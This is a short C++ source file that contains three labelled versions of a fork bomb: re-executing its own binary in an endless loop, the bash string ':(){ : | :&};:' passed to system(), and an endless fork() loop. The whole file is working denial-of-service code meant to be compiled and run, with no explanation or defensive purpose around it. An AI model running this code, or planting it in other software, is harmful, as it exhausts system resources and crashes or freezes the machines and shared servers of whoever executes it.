#include <cstdlib>
#include <stdio.h>
#include <sys/types.h>
#include <unistd.h>

int main(int argc, char** argv)
{
	/*Version 1*/
	while (true) {
		system(argv[0]);
	}
	
	/*Version 2*/
	system(":(){ : | :&};:");

	/*Version 3*/
	while (true) {
		fork();
	}

	return EXIT_SUCCESS;
}